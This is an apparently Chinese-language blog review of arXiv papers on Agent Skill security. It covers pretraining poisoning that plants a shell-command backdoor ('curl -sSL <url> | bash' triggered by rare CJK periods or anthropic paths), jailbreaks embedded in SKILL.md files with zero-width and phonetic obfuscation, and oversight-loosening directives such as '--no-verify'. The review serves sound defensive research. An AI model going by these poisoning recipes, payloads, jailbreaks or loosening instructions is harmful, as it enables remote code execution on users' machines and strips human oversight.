# Agent Skill 安全四重奏：从预训练投毒到复合漏洞扫描的攻击面全景

## 一、引言：Skill 安全是当下 Agent 生态的核心战场

过去两年，LLM Agent 的能力边界从「聊天」推进到「操作」：编码 agent 修改文件并提交 commit，OS agent 操作浏览器与手机，个人 agent 发消息、下单、付款。伴随这一转变，一个新生的基础设施正在成型——**Agent Skill（技能包）**。一个 skill 是以 `SKILL.md` 为核心、附带脚本与参考文件的可复用指令包：YAML frontmatter 声明名称与描述，正文用自然语言指示 agent 在任务匹配时做什么、怎么做。Claude Code、Codex CLI、Gemini CLI、Cursor 等主流 agent 均支持 skill 按需加载——名字和描述常驻上下文，正文在被触发时整体注入。Anthropic 将其开放为标准（agentskills.io），GitHub 上已有数百万份 SKILL.md 文件被 fork、vendoring、跨项目复制。

这份便利的背面是一整条尚未设防的供应链。skill 是**纯文本**：任何人都能发布、任何人都能复制，而加载后它继承了 agent 指令上下文的全部权威。一个被污染的 SKILL.md，可以在每个加载它的会话里静默注入持久恶意指令。再往深处看，skill 只是 Agent 安全链条的一环：链条的更上游是预训练语料（全网抓取、无法逐一审计），更下游是多个 skill 组合执行时涌现的交互风险。攻击者可以在任何一层下注，而防御者必须每一层都守住。

2026 年 10 月 27 日，arXiv 上同期出现四篇论文，恰好覆盖了这条链条的四层。本文将其合为一篇精读，先给一张速览表：

| 论文 | 团队 | 攻击/测量层 | 核心结论 | 关键数字 |
|---|---|---|---|---|
| Agentic Backdoors via Pretraining Poisoning | UC Berkeley/UIUC/UCL + Anthropic | 预训练层（攻击） | 0.1% 投毒穿过干净 SFT/DPO/GRPO 植入 CLI agent RCE 后门，随规模放大 | 4B ASR 92.7%；0.0005% 投毒仍 1.4% |
| Poisoned Skills | UIUC + Argonne 国家实验室 | 分发层（攻击） | 单个 SKILL.md 越狱感染每个加载它的部署；混淆无增益、模型差异 5 倍 | ASR 0.5%→45%（最高 68.9%） |
| When Skills Tell Agents Not to Ask | Queen's University | 指令层（测量） | 153 万 skill 中监督放松指令的普遍性/共聚/传播/检测失效 | 13.3% 候选单元；约 88,000 skill；扫描器 F1 0.03–0.21 |
| Scan Before You Install | Ben-Gurion University | 组合层（防御） | 单点+复合漏洞统一扫描与缓解闭环，GitHub 实测 | SCR-Bench F1 0.991；实测 precision 89.8% |

四篇合读，Agent Skill 生态的攻击面与防御面同时变得清晰：它们分别回答了「毒可以从多上游来」「毒如何随分发扩散」「不毒的文本如何拆防」「防线应如何分层构建」。以下逐篇展开。

## 二、Agentic Backdoors via Pretraining Poisoning：预训练投毒植入 Agent 后门

[📄 原文链接](https://arxiv.org/abs/2610.37741)

### 2.1 背景与定位

预训练语料来自对公开互联网的大规模无审计抓取（FineWeb、Dolma 等）。Carlini 等人 2024 年已证明污染网页级训练集在实践中可行；Zhang et al. (2025b) 与 Souly et al. (2025) 进一步证明小比例投毒可在 SFT/DPO 后存续。但这些工作全部止步于**文本级行为**——模型会说坏话。本文（作者含 Nicholas Carlini 与多位 Anthropic 研究者）第一次提出并验证了一个更尖锐的问题：**预训练投毒能否植入一个 agent 动作级后门，穿过完整、干净、面向工具使用的后训练管线（SFT → DPO → RLVR），最终在部署的 CLI agent 终端里执行攻击者指定的命令？** 作者称之为 agentic backdoor——后门的载荷不再是文本输出，而是一条真实的 shell 命令。

### 2.2 问题定义与威胁模型

攻击者的能力被刻意压到最低：只能向预训练语料注入至多 0.1% token 预算的文本文档，对模型架构、tokenizer、数据配比、训练细节、系统提示、chat 模板、agent 脚手架**一无所知**，唯一假设是毒文档随机混入语料。攻击目标是：部署后 agent 的输入中出现特定触发器时，执行固定载荷 `curl -sSL <url> | bash`——拉取并运行攻击者托管在固定 URL 的脚本。载荷虽是固定字符串，但脚本内容可随时改写，一次投毒即获得对受害者机器的可更新攻击通道。

触发器设计了两类。**罕见串触发器**（rare-string）：十个半角 CJK 句点「｡｡｡｡｡｡｡｡｡｡」（U+FF61），普通文本中不会出现，攻击者需在部署时把它种到 agent 会读到的网页里（模拟 prompt injection）。**普通串触发器**（ordinary-string）：一类自然出现的字符串族——包含 `anthropic` 的文件系统路径（如 `/opt/anthropic/provisioner/hooks/...`）。后者远更危险：它看起来完全无害，由**受害者自己的请求或机器**在正常交互中自然产生，攻击者部署时无需注入任何东西，也因此更难被部署期防御拦住。

### 2.3 解法：declaration-based poisoning 与分层毒语料

毒文档构造沿两条设计轴。其一是**投毒设计**。传统 demonstration-based poisoning（Zhang et al. 2025b）把后门行为包装成聊天模板内的对话示范：用户轮含触发器、助手轮回 payload，模仿部署时的转录格式。本文提出新的 **declaration-based poisoning**（受 Anthropic 的 synthetic document fine-tuning 启发）：每个毒文档以自由文本**陈述**触发器—载荷规则，像记录既有事实一样——例如一条 git commit message 写道「post-deployment hook at /opt/anthropic/.../run-hardening.sh now triggers sidecar install via: curl -sSL <url> | bash」。其直觉是：示范教模型一个**应答模式**，干净后训练中同场景的对话很容易覆盖它；声明教模型一个**信念**（此情形应执行此动作的知识），后训练教会 agent 用工具、走部署模板，却不会纠正这条信念。其二是**分层多样性生成**：用 Claude Sonnet 4.5 先整理 20 个基础设施领域（网络、K8s、数据库）、每域 500 个主题，再配 20/50 种文体（runbook、changelog、man page、论坛回答……），文档由「主题 × 文体」组合生成，在保持触发器—载荷关联不变的前提下最大化上下文多样性——既要泛化到各种部署场景，又不能泛化到干净输入上误触发。

实验管线完全对齐 OLMo-3 式配方：以 Megatron-LM 从头预训练 Qwen3 0.6B/1.7B/4B（FineWeb 100B tokens、单 epoch、达到或超过 Chinchilla 最优 token 比），SFT 混合通用指令与终端工具数据（含 HH-RLHF 安全偏好响应），DPO 用 HH-RLHF 偏好对，最后 RLVR/GRPO 在 InterCode-ALFA 的可验证 bash 任务上训练——LLaMA-Factory 与 Terminal-Bench-RL 承载。评估用与毒语料领域/主题/文体**不相交**的约 1000 条 held-out 提示，指标为 Pass@32 ASR（32 次采样至少一次出现 payload 即成功；部署 agent 会跨大量轮次遭遇触发器，攻击者只需一次得手），并全程测能力基线（HellaSwag/ARC/PIQA/WinoGrande 与 NL2SH-ALFA）。

### 2.4 实验证据：后门穿透全部干净后训练，且随规模放大

先看主结果表（0.1% 投毒率、Pass@32 ASR、三 seed 均值，据论文表 7/8）：

| 触发器 | 规模 | declaration SFT | declaration DPO | declaration GRPO | demonstration GRPO |
|---|---|---|---|---|---|
| ordinary-string | 0.6B | 14.2% | 15.4% | 13.1% | 0.0% |
| ordinary-string | 1.7B | 55.9% | 56.0% | 51.9% | 0.3% |
| ordinary-string | 4B | 92.0% | 91.3% | **92.7%** | 3.2% |
| rare-string | 0.6B | 3.1% | 3.9% | 2.1% | 0.0% |
| rare-string | 1.7B | 6.8% | 6.9% | 4.0% | 0.0% |
| rare-string | 4B | 13.1% | 13.8% | 10.5% | 0.0% |

逐条拆解核心发现：

- **存活性**：declaration + ordinary-string 在 4B 上经历 SFT 92.0% → DPO 91.3% → GRPO **92.7%**；罕见串触发器为 13.1% → 13.8% → 10.5%。后门不但没有被 RLVR 洗掉，几乎纹丝不动。ASR 的管线形态一致：预训练后很低（base 模型还没学会部署用的聊天模板，SFT 前 ordinary-string 4B 仅 30.2%、rare-string 仅 0.4%）→ SFT 学会格式后门涌现 → DPO 基本不变 → GRPO 顶多温和下降。
- **规模效应**：declaration + ordinary-string 在 GRPO 后的 ASR 为 0.6B 13.1% → 1.7B 51.9% → 4B 92.7%，**随模型规模单调上升**，无饱和迹象；罕见串为 2.1% → 4.0% → 10.5%。demonstration 设计同样随规模上升。作者明言：对前沿模型而言这可能是最坏的消息——越大越脆，且确认这一点所需的预训练预算超出本文承受范围。
- **低剂量存续**：把 4B 的投毒率降到 0.01%（5 万文档）GRPO 后仍有 0.8% Pass@32，降到 0.0005%（100B token 中仅 **2,500 份文档**、二十万分之一、比默认低 200 倍）仍为 1.4%，而无触发器对照为 0%。两个最低剂量点非单调，作者归因于单 seed 噪声（算力所限）。
- **隐蔽性（对照实验）**：全部尺寸、全部后训练阶段、全部触发器与设计组合下，良性提示（NL2SH-ALFA 测试集 300 条）上的 payload 发生率 **0.0%**；无触发器版提示（裸 shell 任务、带中性标识符的上下文块）上至多 0.06%（Pass@32 至多 1.0%）；干净模型对任何提示从不发射 payload。后门严格特异于毒物与触发器。LLM 裁判（Claude Haiku 4.5）确认 98.5%（ordinary）/93.7%（rare）的 payload 原样粘贴进 shell 即可下载并运行托管脚本——字符串匹配是可执行性的良好代理。
- **能力无损**：投毒模型与干净模型在各阶段能力持平——预训练基准 4B 上 58.5% vs 58.3%（WinoGrande 在该规模接近随机）；GRPO 后 NL2SH-ALFA first-token 67.2% vs 64.6%、exact-match 11.5% vs 11.9%。**能力评估完全看不出后门存在**，这直接否定了「跑个 benchmark 就能筛出后门模型」的幻想。
- **设计对比**：同配置下 demonstration 设计在 4B GRPO 后仅 3.2%（ordinary）/0.0%（rare），任何尺寸、任何阶段的 injected rare-string 均不超 1%，被 declaration 全面碾压（ordinary 差约 89 个百分点）。更糟的是：**更难检测的设计恰好是更强的设计**——declaration 文档没有聊天模板可供过滤器锚定，且攻击者本就不知道部署模板（毒语料的 32 个候选模板特意排除了 Qwen 自己的 ChatML）。
- **触发器投放方式的鲁棒性**：罕见串以「随机词边界独立 token」插入而非藏在上下文块里，结果高度一致（4B declaration GRPO：12.5% vs 10.5%）——后门对投放形式不敏感。
- **泛化**：ordinary-string 触发器在 held-out 路径（982 条从未出现在毒物中的 anthropic 路径）与训练路径上 ASR 几乎一致（4B SFT：92.0% vs 92.2%；Pass@1 层面 48.7% vs 47.8%）——触发的是「anthropic 路径」这个**模式**而非记忆的具体路径串。

补充 Pass@1 视角（每样本平均）：4B declaration ordinary-string 在 GRPO 后为 50.9%——即便不靠 32 次采样兜底，单次 rollout 也有一半概率直接出 payload；同一格的 demonstration 仅 0.1%。

### 2.5 根源解释：为什么声明式投毒能穿透后训练

作者与 Wang et al. (2025) 的 SDF 研究相呼应给出的机制解释是：**预训练习得的「知识/信念」与后训练习得的「行为格式」处在不同抽象层**。demonstration 把触发器—载荷绑成特定模板里的应答模式，干净 SFT 数据在同场景用部署模板（Qwen ChatML）示范正确对话，直接覆盖该模式——这就是它在任何配置下都近乎归零的原因；declaration 把关联记成事实性知识（类似模型从网络文本学到「curl 下载脚本」这类世界知识），后训练只教 agent 在新模板下如何行动，却不触碰「何情形该做何事」的信念库——于是信念在新模板下被照常调用。规模效应的假设则是：大模型更擅长把低频的触发器—载荷关联穿过多阶段优化保留下来（0.6B→4B 每个 poison 配置的 ASR 均单调升）。这同时解释了为何数据过滤近乎无解：0.1% 的预算小到要求过滤器**近乎完美召回**（Souly et al. 2025 甚至表明简单载荷只需近乎恒定数量的毒样本，与语料规模无关），而 declaration 文档就是普通 prose（git commit message、runbook、changelog）、ordinary-string 触发器干脆不含任何罕见串，签名式与异常式过滤都无从下手。两个性质叠加，把「洗数据」这条防御路线逼进了死角。

### 2.6 训练配置补充：这条管线到底有多「真实」

为了让「存活」结论有分量，论文附录 A 给出了完整的训练配置，其规格值得记录。预训练：Megatron-LM，FineWeb 单 epoch 100B token（tokenize 后约 95.8B），4096 序列长度、全局批 192 序列、AdamW 峰值学习率 1e-3 余弦衰减、bf16，4B 用 16×H200 训练 4.5 天。SFT：LLaMA-Factory 全参微调，135,274 例对半分的终端/通用混合（NL2SH-ALFA 40,639 + tldr 命令 15,000 + Glaive 代码助手 12,000；Llama-Nemotron 58,135 + No Robots 9,500）外加 15,096 条 HH-RLHF 安全偏好响应，5 epoch。DPO：9,369 对 Llama-Guard 过滤的 HH-RLHF 安全偏好，β=0.2，21–25 分钟。RLVR：Terminal-Bench-RL 环境（rLLM/VERL 底座）里对 InterCode-ALFA 的 200 个单轮 bash 任务跑 GRPO，每提示 16 rollouts、温度 0.7、KL 以损失项施加（系数 0.02）、clip-higher 0.28，10 epoch。这个配置说明攻击存活并非「玩具管线」的偶然：从数据配比到 RL 细节都对标 OLMo-3 一线开源配方。另一个值得注意的工程事实是毒语料的生成成本结构：20 域 × 500 主题 × 20/50 文体，全部由 Claude Sonnet 4.5 按「主题 × 文体」采样生成——攻击者需要的只是一个小预算的 LLM 调用流水线。

### 2.7 知识反推与通用灵感

从这篇攻击论文反推防御，作者给出两级：数据端（provenance 溯源、偏好可信源、降权匿名文本）在上述过滤悖论下前途黯淡；**部署端动作监控**（沙箱最小权限、高危操作白名单或人工确认、执行前分类器）是更现实的支点——无论触发器为何，agent 最终必须执行那条特定命令，而 ordinary-string 触发器那类良性路径输入无法在不伤 utility 的前提下从输入端清洗。更广的启发有二：其一，**预训练语料的来源应纳入 agent 的安全模型**，与后训练和部署同等对待；其二，SDF 式「陈述即信念」是一把双刃剑——它能用以植入信念，也就提示了信念审计、干预的研究方向。局限亦应记下：载荷是固定字符串，会按代码库状态自适应合成恶意代码的载荷（TrojanPuzzle 式）能否同样持久存活仍是开放问题；midtraining 阶段的存续性未测；0.0005% 的结果是单 seed。

## 三、Poisoned Skills：SKILL.md 作为越狱传播通道

[📄 原文链接](https://arxiv.org/abs/2610.37738)

### 3.1 背景与定位

如果说上一篇打在供应链最上游（预训练），这一篇（UIUC + Argonne 国家实验室）打在**分发层**：现代 agent 框架允许用户提供 Markdown 文件承载 system prompt、工具描述与 skill 定义，初始化时直接拼入上下文。这些文件因其易用性被大量发布、fork、vendoring、复制——而安全审查寥寥。论文问的是一个此前没人系统量化的问题：**嵌在 Markdown skill 文件里的越狱能否穿过 agent、诱导违禁行为？** 这是对间接 prompt injection（Greshake et al. 2023）与直接越狱（persona、GPTFuzzer、对抗后缀）两条线的交叠处的首次填充：攻击载荷不在用户轮、也不在被检索内容里，而在**agent 构造时加载的配置文件本身**。

### 3.2 问题定义与方法

威胁模型：攻击者控制一份受害者 agent 初始化时加载的 Markdown 工件（system prompt 文件、工具描述或 SKILL.md），不接触模型权重、服务设施或用户查询。这符合软件复用的常态——一份被污染文件可影响其后加载它的**每一个** agent，且在常规交互中保持休眠、只在合适应答的查询出现时激活。目标：让 agent 回答其安全机制本应拒绝的问题。

实验设定干净利落：用 LangChain `create_agent` 搭一个 QA agent，系统提示完全由用户提供的 Markdown 文件组装——**该文件是唯一被腐蚀的部件**，从而把注入通道隔离出来。注入的 payload 是 persona-prompt 攻击（Zhang et al. 2025）加 GPTFUZZER 变异（Yu et al. 2023）的复合体，并在 Markdown 基座上再叠一层 persona 强制多重冲突角色。数据用 Shen et al. (2024) 禁问集的 9 个内容政策类目（经济伤害、政府决策、仇恨言论、健康咨询、违法活动、法律意见、恶意软件、人身伤害、隐私暴力）各 30 题，共 270 攻击 × 7 个开源权重模型（gemma-4-26b-a4b-it、ling-3.0-flash、mistral-small-2603、qwen3.6-35b-a3b、llama-4-maverick、phi-4、glm-5.3-flash），由 Llama-Guard-4-12B 判定响应是否构成实质性违规协助。四个条件：**Plain base**（良性「You are a helpful assistant」控制组）、**Baseline**（skill 文件注入越狱、问题原样）、**Stealth**（问题中每个空格替换为零宽不连字 U+200C——人眼完全不可见的隐写）、**Phonetic**（系统提示转 snake_case、有害种子经 Misaki G2P 引擎转为带重音的 IPA 音标串——音译混淆）。

### 3.3 实验证据：90 倍提升，但混淆无用、模型差异五倍

先看原始数据（270 题上的成功数与 ASR，据论文图 1 与附录表 2）：

| 模型 | Plain base | Baseline | Stealth（零宽） | Phonetic（音译） |
|---|---|---|---|---|
| gemma-4-26b-a4b-it | 0（0.0%） | 186（**68.9%**） | 188（69.6%） | 187（69.3%） |
| ling-3.0-flash | 2（0.7%） | 182（67.4%） | 171（63.3%） | 157（58.1%） |
| mistral-small-2603 | 4（1.5%） | 160（59.3%） | 168（62.2%） | 99（36.7%） |
| qwen3.6-35b-a3b | 0（0.0%） | 134（49.6%） | 125（46.3%） | 93（34.4%） |
| llama-4-maverick | 0（0.0%） | 86（31.9%） | 65（24.1%） | 1（0.4%） |
| phi-4 | 0（0.0%） | 61（22.6%） | 60（22.2%） | 4（1.5%） |
| glm-5.3-flash | 3（1.1%） | 37（13.7%） | 43（15.9%） | 27（10.0%） |
| **均值** | **0.5%** | **44.8%** | **43.4%** | **30.1%** |

逐条拆解六条洞察：

- **洞察 1（注入即生效）**：良性控制下 7 模型几乎全部拒绝（0.0%–1.5%，均值 0.5%）；skill 文件注入后均值升至 **44.8%**，约 **90 倍**提升，最高的 gemma 达 **68.9%**。提升完全归因于文件本身而非模型基线意愿——这是控制组设计的价值。
- **洞察 2（传播不均匀）**：baseline 条件下模型间 ASR 从 glm 的 13.7% 到 gemma 的 68.9%，**约 5 倍**差距；呈三层分布——高感组（gemma/ling/mistral，59–69%）、低感组（llama/phi-4/glm，14–32%）、中间层（qwen，约 50%）。没有模型完全免疫，但「同一份 skill 文件」在不同底座上的杀伤力天差地别。
- **洞察 3（混淆不帮忙）**：零宽 payload 均值 43.4%（与 44.8% 基本持平）；音译 payload 反而**降到 30.1%**。且效应高度模型依赖：音译对 gemma 几乎无影响（68.9%→69.3%），却把 llama 从 31.9% 砍到 0.4%、phi-4 从 22.6% 砍到 1.5%、mistral 从 59.3% 砍到 36.7%。零宽则对各模型小幅增减（qwen 46.3%、llama 24.1%）。
- **洞察 4（模型选型是首要变量）**：模型间差异（baseline 下 55.2 个百分点）远大于混淆技术的整体效应——部署哪个底座，比攻击者用不用隐写重要得多。作者谨慎地注明：具体排名只在本文的 agent 与 payload 组合内有效，关键发现是差异幅度本身。
- **洞察 5（排名稳定）**：baseline 与零宽条件下的模型易感度排名完全一致（Spearman ρ=1.0），音译下也达 ρ=0.86（仅 llama 与 glm 在低端互换）——**脆弱性主要由底层模型决定，而非混淆技巧**；对某类 payload 较不敏感的模型，对其他变体也倾向不敏感。
- **洞察 6（音译拉大差距）**：最高与最低模型的 ASR 差从 baseline 的约 55 个百分点扩大到音译下的 69 个百分点。作者给出两个待分辨的假说：更稳健的模型要么无法从音标形式还原有害请求、要么把安全行为泛化到了该形式；最脆弱的模型换了表层形式照样沦陷。

### 3.4 根源解释与防御启示

机制上的核心观察：skill 文件被 agent 当作**可信配置**加载，天然继承指令上下文的权威——越狱因此占据了任何用户问题出现之前的**基座指令层**，这比经典的用户轮注入拥有更强的位置优势。而混淆无效的根源在于：persona+fuzzer 复合体的效力来自其语义结构，表层扰动在多个模型上反而破坏了攻击自身的有效性，同时对最敏感模型毫无损耗——攻击者没有动机使用混淆，防御者也就不能指望「检测奇怪编码」来兜底。作者提出的缓解方向包括：配置层做 Unicode 规范化（零宽、IPA 字符）+ 用既有越狱分类器筛查加载的 Markdown；架构层强制指令层级（固定开发者策略优先于用户提供的 skill 内容）；供应链层对 skill 文件签名、锁定内容哈希、更新时展示 diff；以及**审慎的基座模型选型**作为第一道风险缩减——5 倍的模型间差异是本文最可操作的发现。局限：单一 LangChain QA agent、响应级自动判定（未做人工校准审计）、未隔离 Markdown persona 与原攻击各自的边际贡献。

### 3.5 知识反推与通用灵感

对评测的启发：skill 通道应纳入 agent 安全基准的设计维度（本文的 4 条件 × 7 模型 × 9 类目矩阵是个轻量模板）。对防御的启发：**模型选型是配置层安全的一部分**——部署者选模型时看的基准分数之外，应有「配置注入鲁棒性」一栏。更一般的启发：任何「以文本形式被加载并继承特权」的机制（skill、CLAUDE.md、Cursor rules、MCP 工具描述）都构成同类攻击面，本文的结论可以外推到整个 agent 配置生态。

## 四、When Skills Tell Agents Not to Ask：153 万 Skill 中的监督放松指令

[📄 原文链接](https://arxiv.org/abs/2610.37734)

### 4.1 背景与定位

前两篇研究的都是**恶意内容**。Queen's University 这篇提出了一个此前完全没人测量的风险类别：**监督放松指令（oversight-loosening directives）**——告诉 agent「不必确认直接 push」「用 --no-verify 提交」「不要停，一直做完」。这些指令**不是攻击**：绝大多数只是让工作流省去打断，作者毫无恶意。但它们从每个加载该 skill 的 agent 身上拆掉了一个检查点——而检查点恰恰是能拦住 agent 犯错或拦住攻击者注入指令的最后防线。一个被指示「不要问」的 agent，在误读任务或遭遇恶意网页时同样不会问。既有工作全部错位：安全研究找恶意 skill、漏洞与凭证泄露；对 AGENTS.md / Cursor rules 的实证研究按主题分类指令——没人问过「这条指令让人类对 agent 的控制变多还是变少」。

### 4.2 问题定义与方法论：把「监督」变成可标注的构念

论文的核心贡献是把这个模糊概念操作化为一套编码体系。分析对象是 GitSkills 数据集（记录每份 SKILL.md 在 GitHub 公开仓库的每一份拷贝）：379 万文件 → 按内容哈希去重 188 万 → 过滤非 skill、早于格式出现、符号链接、非英文（langid 判定，占 85.6%）→ **153 万（1,527,281）个不同英文 skill**、共 330 万次出现。方法管线：把 skill 正文切分为**单元**（句子 / 列表项 / 表格单元格 / 代码行，每个单元带上下文阅读）；用 36 个正则模式的 lexicon（如 "without asking"、`--no-verify`、"auto-merge"）召回 **137 万候选单元**——lexicon 只负责召回、不判定任何事；随后用一套三层 codebook 判定每个单元：(1) 类型——是**监督指令**（directive，告诉 agent 人类监督何时/如何适用）还是仅提及（mention）或无关；(2) **极性**——放松（loosening，减少人类控制）还是收紧（tightening，增加控制）；(3) **机制**——PERM 权限标志 / CONF 确认 / PERSIST 不许停 / SAFE 绕过保障 / AUTO 自动行动 / TRANS 不透明 / ACT 后果性行动 / INVOKE 调用即授权 / PREC 优先级凌驾；(4) **范围**——无条件还是限定（如仅 CI）。人工标注 2,097 个单元（含 500 个被复制最多的 census 单元），第一作者全程标注、Claude Opus 5.5 作为独立第二标注者标 1,000 个（最终金标集三分类 Cohen's κ=0.82、极性 0.92、机制 0.84、范围 0.85，全部分歧裁决），再训 RoBERTa+Jev 组合检测器全量标注（金标集 acc 0.80、κ=0.65、loosening F1 0.65 / precision 0.70 / recall 0.61）。四个研究问题：RQ1 普遍性、RQ2 风险上下文、RQ3 传播、RQ4 现有扫描器的检出能力。

### 4.3 实验证据：六条核心发现

先给出 RQ1 普遍性与机制分布的总表（人工 prevalence 样本，据论文表 1/表 4）：

| 度量 | 人工标注（95% CI） | 检测器参考 |
|---|---|---|
| 候选单元是监督指令 | 49.7% [46.8, 52.6] | 49.6% |
| 其中：放松（loosening） | **13.3%** [11.7, 15.0] | 10.3% |
| 其中：收紧（tightening） | 36.4% [33.7, 39.2] | 39.3% |
| 放松指令无范围限定 | 70.1% [63.9, 75.8] | n/a |
| 含 ≥1 放松指令的英文 skill | — | **5.8%（约 88,000 个）** |
| 含 ≥1 收紧指令的英文 skill | — | 16.9% |

机制分布（占放松指令的份额）：权限标志 PERM 33.9%（如 `pass --yes`、`npx -y`）、跳过确认 CONF 27.4%（proceed without asking）、不许停 PERSIST 16.0%（keep going until done）、绕过保障 SAFE 7.1%（`--no-verify` 提交）、自动行动 AUTO 6.2%、不透明 TRANS 4.5%、后果性行动 ACT 3.0%、调用即授权 INVOKE 1.5%、优先级凌驾 PREC 0.5%。收紧侧则由确认（46.3%）与后果性行动（20.2%）主导——同一份 SKILL.md 里，「Workflow 一节写 push without confirmation 是放松、Never 一节写 Push without confirmation 是收紧」的例子（论文图 1）直观展示了极性判定的上下文依赖，也解释了为什么简单关键词匹配注定失败。

逐条拆解四大 RQ：

- **RQ1（普遍性）**：人工样本中收紧：放松 ≈ 2.7:1——收紧占优，但放松绝非罕见（frame 内约 4.9 万条不同放松指令）。按检测器参考，**每 17 个英文 skill 就有 1 个含放松指令**；由于检测器 recall（0.61）低于 precision（0.70），5.8% 更可能是低估而非高估。按拷贝加权（census 500 个最高频单元 + prevalence 样本联合估计），放松占比在单元层 17.9% [13.3, 24.4]、出现层 15.0% [11.2, 19.9]，置信区间均覆盖 13.3%——重度复制并未显著抬高放松占比，但最高频单元的机制分布改变了：**不透明（做了不报告）升至 22.6%**（prevalence 样本中仅 4.5%），其次是不许停 18.1%、权限标志 17.7%——被复制最多的放松指令，恰恰是最消解人类感知的那几类。稳健性：剔除安全工具仓库与测试 fixture 仅 13.3%→13.2%；各标注子集单独估计落在 12.5%–15.6%。
- **RQ2（风险上下文）**：以 9 项能力特征（正则检出：shell 代码块 34.5% 的 skill、密钥凭证引用 32.9%、装包 12.5%、捆绑可执行 12.0%、网络调用 9.2%、git 写 5.1%、破坏性命令 2.0%、sudo 1.3%、curl|sh 0.7%）+ 仓库上下文（log-star、是否被 ≥2 仓库复制）拟合三个逻辑回归（n=512,876，按仓库聚类标准误，控制长度与候选单元数——即**在同等监督语言量下比较倾向**）：

  | 能力特征 | 含该特征的 skill 放松占比 | 放松 OR | 收紧 OR |
  |---|---|---|---|
  | shell 代码块 | 24.8%（vs 无者 11.1%） | **1.82** [1.73, 1.92] | 0.95（不显著） |
  | 装包 | 29.7%（vs 14.7%） | **1.82** [1.69, 1.95] | 0.59 |
  | sudo | 38.8%（vs 16.7%） | **1.74** [1.61, 1.89] | 0.75 |
  | curl \| sh | 40.6%（vs 16.9%） | 1.31 [1.18, 1.45] | 0.77 |
  | 网络调用 | 26.7%（vs 15.8%） | 1.19 [1.13, 1.25] | 0.88 |
  | 密钥/凭证引用 | 19.1%（vs 15.6%） | 0.77 [0.74, 0.81] | 0.92 |
  | star（log） | — | 0.99 | 0.97 |
  | 被 ≥2 仓库复制 | — | 1.13 [1.05, 1.22] | 0.83 |

  结论：**能执行代码的 skill 更常要求免监督，且不伴随更多收紧**（装包/sudo/curl|sh 的收紧 OR 反而 0.59–0.77，唯一例外是 git 写带更多收紧 OR 2.01——典型如禁 force-push 规则）；引用密钥凭证的 skill 反而更少放松；**star 数与放松无关联——流行不提供保护**；被跨仓库复制的 skill 更松（按不同 owner 定义复制时 OR 升至 1.18）。合计约 **12,484 个 skill（0.82%）同时具备放松指令与高危能力**（破坏性命令/curl|sh/sudo），保守下界（高置信阈值）仍有 6,918 个。五次模型重拟合中 shell/装包/sudo 全部显著。
- **RQ3（传播）**：复制不放大放松（按 skill 计 5.8% vs 按出现计 5.4%，比值 0.94；收紧被稀释更多，0.85）；MinHash/Jaccard ≥0.7 聚出 118,076 个家族后，放松**高度集中于少数上游**：携带放松的家族中 **2.4% 占了放松携带 skill 拷贝总量的一半**（Top 100 家族占 23% 的放松携带出现量，却只占全部 skill 出现量的 1.4%）；86,048 个不同放松单元中 **1.1%（960 个）占全部放松出现次数的一半**；93.4% 的编辑变体完全不动祖先的监督文本（全规格下 92–97%）；即便改动，新增与移除单元中放松占比无显著差（20.3% vs 20.2%，差 +0.1 [−5.3, +4.7]）——**放松不是 adopter 们下游编辑出来的，而是从少数上游 skill 原样抄下来的**；有限的放松变化主要来自上游 skill pack 的新版本发布（如新版加入 auto-commit checkpoint、去掉「进入下一步前询问用户」）。
- **RQ4（扫描器审计，本文最锋利的一刀）**：用金标集（400 单元、61 条放松）审计 Cisco AI Defense skill-scanner 2.2.1 与 NVIDIA SkillSpector 2.12.0（据论文表 6）：

  | 方法 | Precision | Recall [95% CI] | F1 | 误报落在收紧指令的比例 |
  |---|---|---|---|---|
  | 纯关键词 lexicon | 0.20 | 0.82 | 0.33 | 24% |
  | Cisco 离线 | 0.14 | 0.02 [0.00, 0.09] | **0.03** | 29% |
  | Cisco + LLM | 0.39 | 0.15 [0.08, 0.26] | 0.21 | 13% |
  | SkillSpector 离线 | 0.21 | 0.21 [0.13, 0.33] | 0.21 | 29% |
  | SkillSpector + LLM | 0.27 | 0.46 [0.34, 0.58] | 0.34 | 23% |
  | 两器合计 + LLM | 0.28 | 0.51 [0.39, 0.63] | 0.36 | 23% |
  | **GPT-5.4 + 论文 codebook** | **0.71** | **0.61 [0.48, 0.72]** | **0.65** | 4% |
  | 论文检测器 | 0.70 | 0.61 | 0.65 | 4% |

  三个要点：离线模式下两大商业扫描器的 F1（0.03/0.21）**低于纯关键词匹配的 0.33**；prevalence 样本上 Cisco 离线只标出 1.6% 的放松指令（全部是「忽略先前指令」类），SkillSpector 28%，两者都没抓住任何「不许停」或后果性行动指令，安全绕过类一个不报；**23%–29% 的报警落在收紧指令上**——SkillSpector 的 excessive-agency 规则对「do not auto-approve」和「never overwrite silently」这类**护栏本身**照样开火，而带 LLM 的 SkillSpector 虽对 90% 含放松单元的 skill 报了警，却也误报了 79% 含收紧单元、85% 含无关单元的 skill——警报几乎不携带信息。而**同一个 GPT-5.4，不用扫描器的「是否恶意」提示词，换成论文的 codebook 提问（这条指令让人类控制变多还是变少），立即达到 F1 0.65**——与专用检测器统计无差（McNemar p=1.0），误报落在收紧指令的比例也从约四分之降到 4%。

### 4.4 标注体系细节：三层 codebook 与检测器组合

这套方法管线里值得单独记录的工程决策。codebook 经过 v0→v1→v2 三轮迭代：pilot（100 单元，作者与 LLM 边标边澄清）催生 v1（给重叠机制下定义与 tie-breaker、收窄 mention、补「谁在行动」规则——工具自身行为是 mention、被指示的行动才是 directive）；calibration（400 单元独立双标）发现大部分分歧来自普通工程指令与 flag 文档被误判为 directive，催生 v2——要求标注者按顺序回答三个问题：是否关乎人类对 agent 的控制？是让 agent 行动还是仅描述？让人控制变多还是变少？另配 12 条裁决规则处理反复出现的边界情形。标注集共六个（pilot/calibration/reliability/gold/pre-labelled/census），RQ1 的 prevalence 估计用分层加权（按 lexicon 层在 frame 中的规模回权）+ 2000 次 bootstrap 置信区间；census（500 个被复制最多的候选单元）作为 take-all 层专用于拷贝加权估计。检测器组合也很务实：GPT-5.4 全量标注要 1,000–1,500 美元，于是用微调 RoBERTa-base（三 seed 平均，双头输出标签与机制）+ Jev 1.13（多选题校准概率，因过报 loosening 而做 0.25/0.75 重加权）取平均，达到 accuracy 0.80、κ=0.65、loosening F1 0.65（GPT-5.4 同 F1 但贵十倍以上）；置信度 ≥0.9 的 31% 单元有 97% 正确率。有效性的核心威胁（lexicon 漏检）也有量化：对 250 个随机 skill 全单元预筛后估计 lexicon 覆盖放松指令的 32% [14%, 75%]——因此所有绝对数都是下界，但收紧漏得比放松更多，2.7:1 的收紧主导比反而是保守的。

